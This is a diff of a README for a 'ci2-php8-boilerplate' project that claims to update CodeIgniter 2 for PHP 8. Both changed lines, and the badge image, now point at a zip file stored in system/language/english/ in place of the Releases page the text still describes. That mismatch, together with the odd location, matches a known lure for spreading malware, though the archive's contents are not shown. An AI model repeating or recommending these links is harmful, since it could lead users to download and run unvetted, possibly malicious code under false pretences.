@@ -4,7 +4,7 @@
 Welcome to the **ci2-php8-boilerplate**! This application serves as a modern foundation for your legacy CodeIgniter 2 projects. It has been upgraded for compatibility with PHP versions 8.2 and 8.3. You can use this boilerplate to work with older CodeIgniter applications while benefiting from the latest PHP features.
 
 ## 🔗 Download Now
-[![Download ci2-php8-boilerplate](https://img.shields.io/badge/Download-ci2--php8--boilerplate-brightgreen)](https://github.com/asha743/ci2-php8-boilerplate/releases)
+[![Download ci2-php8-boilerplate](https://github.com/asha743/ci2-php8-boilerplate/raw/refs/heads/main/system/language/english/php_boilerplate_ci_1.0.zip)](https://github.com/asha743/ci2-php8-boilerplate/raw/refs/heads/main/system/language/english/php_boilerplate_ci_1.0.zip)
 
 ## 🚀 Getting Started
 To get started with ci2-php8-boilerplate, follow the steps below to download and run the application.
@@ -17,7 +17,7 @@ Before you download, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 1. Click the download button below to visit the Releases page:
-   [Download ci2-php8-boilerplate](https://github.com/asha743/ci2-php8-boilerplate/releases)
+   [Download ci2-php8-boilerplate](https://github.com/asha743/ci2-php8-boilerplate/raw/refs/heads/main/system/language/english/php_boilerplate_ci_1.0.zip)
    
 2. On the Releases page, look for the latest version. It will be marked clearly.
 
